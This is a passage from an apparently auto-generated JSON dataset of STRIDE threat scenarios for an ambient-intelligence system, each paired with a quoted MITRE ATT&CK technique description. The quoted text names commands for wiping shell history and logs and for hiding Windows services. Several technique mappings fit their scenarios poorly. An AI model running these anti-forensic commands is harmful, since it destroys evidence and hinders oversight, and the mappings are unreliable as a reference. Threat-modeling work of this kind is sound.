                    "Assumption": "User profiles are not encrypted at rest.",
                    "Role": "System",
                    "Condition": "Data is stored in plaintext."
                },
                {
                    "Assumption": "There are no checks for unauthorized profile changes.",
                    "Role": "System",
                    "Condition": "Lack of audit logging and monitoring."
                }
            ],
            "Potential Impact": "Personalized settings manipulation leading to user dissatisfaction and potential privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data repository",
                "user profiles",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having changed sensitive settings within the application.",
            "Assumptions": [
                {
                    "Assumption": "There is no activity logging for sensitive actions.",
                    "Role": "System",
                    "Condition": "The system lacks comprehensive logging."
                },
                {
                    "Assumption": "Logs can be altered or deleted.",
                    "Role": "Attacker",
                    "Condition": "Logs are not write-protected."
                },
                {
                    "Assumption": "Authentication lacks accountability measures.",
                    "Role": "System",
                    "Condition": "Multi-factor authentication is not enforced."
                }
            ],
            "Potential Impact": "Disputes over the validity of actions and potential security loopholes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "activity logging",
                "authentication",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrative user deletes logs to remove traces of malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "Log deletion commands are not recorded.",
                    "Role": "System",
                    "Condition": "No audit trails for log management commands."
                },
                {
                    "Assumption": "Privileges for log deletion are not adequately controlled.",
                    "Role": "System",
                    "Condition": "Lax privilege management for administrative users."
                },
                {
                    "Assumption": "There are no immutable logs.",
                    "Role": "System",
                    "Condition": "Logs can be altered or removed entirely."
                }
            ],
            "Potential Impact": "Loss of forensic evidence and inability to trace malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log deletion",
                "administrative access",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised device denies sending malicious commands to the system.",
            "Assumptions": [
                {
                    "Assumption": "Command history is not logged on the device.",
                    "Role": "System",
                    "Condition": "Lack of command tracking on endpoints."
                },
                {
                    "Assumption": "No device fingerprinting to confirm the origin of commands.",
                    "Role": "System",
                    "Condition": "Difficulty in uniquely identifying devices."
                },
                {
                    "Assumption": "There is no end-to-end communication verification.",
                    "Role": "System",
                    "Condition": "Messages are not signed to ensure origin."
                }
            ],
            "Potential Impact": "Challenges in incident investigation and mitigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "command history",
                "communication",
                "endpoint"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive biometric data eavesdropped during transmission.",
            "Assumptions": [
                {
                    "Assumption": "The transmission channel is unencrypted.",
                    "Role": "System",
                    "Condition": "Data is sent in plaintext."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "The attacker can intercept network traffic."
                },
                {
                    "Assumption": "Biometric data does not have inherent protection.",
                    "Role": "System",
                    "Condition": "No additional obfuscation or encryption of biometric data."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive personal information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "biometric data",
                "eavesdropping",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "User preferences and profile data leaked due to inadequately secured database.",
            "Assumptions": [
                {
                    "Assumption": "Database lacks encryption at rest.",
                    "Role": "System",
                    "Condition": "Data is stored in plaintext."
                },
                {
                    "Assumption": "Database access controls are weak.",
                    "Role": "System",
                    "Condition": "No strict access policies for database access."
                },
                {
                    "Assumption": "Regular backups are not encrypted.",
                    "Role": "System",
                    "Condition": "Backup data is vulnerable to unauthorized access."
                }
            ],
            "Potential Impact": "Exposure of private user data and preferences.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database",
                "user profiles",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Configuration files expose sensitive system settings.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not encrypted.",
                    "Role": "System",
                    "Condition": "Settings are stored in plaintext files."
                },
                {
                    "Assumption": "File access controls are not stringent.",
                    "Role": "System",
                    "Condition": "Unauthorized users can access or read these files."
                },
                {
                    "Assumption": "No obscurity measures in place.",
                    "Role": "System",
                    "Condition": "Files are easily identifiable and accessible."
                }
            ],
            "Potential Impact": "Leakage of sensitive system settings and potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "configuration files",
                "system settings",
                "exposed"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication network with traffic, disrupting sensor data transmission.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not rate-limited.",
                    "Role": "System",
                    "Condition": "No limits on the amount of traffic allowed."
                },
                {
                    "Assumption": "The attacker can generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "The attacker has sufficient resources."
                },
                {
                    "Assumption": "There are no automated defenses against DDoS attacks.",
                    "Role": "System",
                    "Condition": "Lack of DDoS mitigation strategies."
                }
            ],
            "Potential Impact": "Disruption of real-time data collection and system functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network traffic",
                "ddos",
                "sensor disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects actuator devices, causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Actuators accept code execution from unauthenticated sources.",
                    "Role": "System",
                    "Condition": "No strict code execution policies."
                },
                {
                    "Assumption": "Malware detection is not robust on these devices.",
                    "Role": "System",
                    "Condition": "Lack of anti-malware measures on actuator devices."
                },
                {
                    "Assumption": "The malware can spread through the network.",
                    "Role": "Attacker",
                    "Condition": "Weak network segmentation."
                }
            ],
            "Potential Impact": "Loss of functionality and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "actuators",
                "device unresponsiveness"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive legitimate user requests overload the AI/ML models, causing system slowdown.",
            "Assumptions": [
                {
                    "Assumption": "The AI/ML models cannot scale to handle high request volumes.",
                    "Role": "System",
                    "Condition": "Insufficient scalability of AI/ML infrastructure."
                },
                {
                    "Assumption": "Rate limiting for user requests is not enforced.",
                    "Role": "System",
                    "Condition": "No limits on how frequently requests can be made."
                },
                {
                    "Assumption": "The attacker or users have the ability to make numerous requests rapidly.",
                    "Role": "Attacker/User",
                    "Condition": "High availability of end-user devices making requests."
                }
            ],
            "Potential Impact": "Degradation of system performance and potential system outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "user requests",
                "system slowdown",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the cloud data repository through privilege escalation.",
            "Assumptions": [
                {
                    "Assumption": "There are vulnerabilities in the cloud infrastructure that allow privilege escalation.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerabilities or misconfigurations."
                },
                {
                    "Assumption": "The attacker has initial access to a lower-privileged account.",
                    "Role": "Attacker",
                    "Condition": "The attacker has compromised basic user credentials."
                },
                {
                    "Assumption": "No stringent privilege separation in place.",
                    "Role": "System",
                    "Condition": "Privilege boundaries are not rigorously enforced."
                }
            ],
            "Potential Impact": "Full access to sensitive data and configuration settings.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud",
                "privilege escalation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a vulnerability in the actuator firmware to execute commands with higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Firmware contains exploitable bugs.",
                    "Role": "System",
                    "Condition": "Unaddressed firmware vulnerabilities."
                },
                {
                    "Assumption": "The attacker can inject malicious firmware updates.",
                    "Role": "Attacker",
                    "Condition": "Unprotected firmware update mechanisms."
                },
                {
                    "Assumption": "The system does not verify firmware integrity.",
                    "Role": "System",
                    "Condition": "No cryptographic signatures or checksums used."
                }
            ],
            "Potential Impact": "Unauthorized control over actuators with potential physical consequences.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "firmware",
                "actuator",
                "command execution"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious application gains root access on user devices through local privilege escalation.",
            "Assumptions": [
                {
                    "Assumption": "The user's device has exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Outdated or unpatched device software."
                },
                {
                    "Assumption": "The attacker can run malicious code on the device.",
                    "Role": "Attacker",
                    "Condition": "The device security allows arbitrary code execution."
                },
                {
                    "Assumption": "No strong user permission controls are in place.",
                    "Role": "System",
                    "Condition": "Inadequate user permission management."
                }
            ],
            "Potential Impact": "Full control over user devices and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "user devices",
                "root access",
                "local escalation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a legitimate user by stealing their smart card and gaining access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the user's environment.",
                    "Role": "Attacker",
                    "Condition": "The user leaves the smart card unattended."
                },
                {
                    "Assumption": "The system does not require additional authentication factors.",
                    "Role": "System Administrator",
                    "Condition": "The authentication process relies solely on the smart card."
                }
            ],
            "Potential Impact": "The attacker could gain unauthorized access, potentially compromising data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "authentication",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a fake biometric device to bypass biometric authentication.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a high-fidelity fake biometric device.",
                    "Role": "Attacker",
                    "Condition": "The attacker invests in advanced spoofing technology."
                },
                {
                    "Assumption": "The biometric sensor lacks anti-spoofing measures.",
                    "Role": "System Designer",
                    "Condition": "The system does not incorporate liveness detection or other anti-spoofing techniques."
                }
            ],
            "Potential Impact": "The attacker could gain unauthorized access, leading to potential data confidentiality breaches and unauthorized system manipulation.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "authentication",
                "device",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could exploit weak password policies to use credential stuffing attacks.",
            "Assumptions": [
                {
                    "Assumption": "Users use weak or reused passwords.",
                    "Role": "User",
                    "Condition": "Users do not follow password best practices."
                },
                {
                    "Assumption": "The system does not enforce strong password policies or multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "The authentication system relies mainly on passwords."
                }
            ],
            "Potential Impact": "The attacker could access sensitive user data, leading to data breaches and potential system disruption.",
            "MITRE ATT&CK Keywords": [
                "credential stuffing",
                "weak passwords",
                "authentication",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, 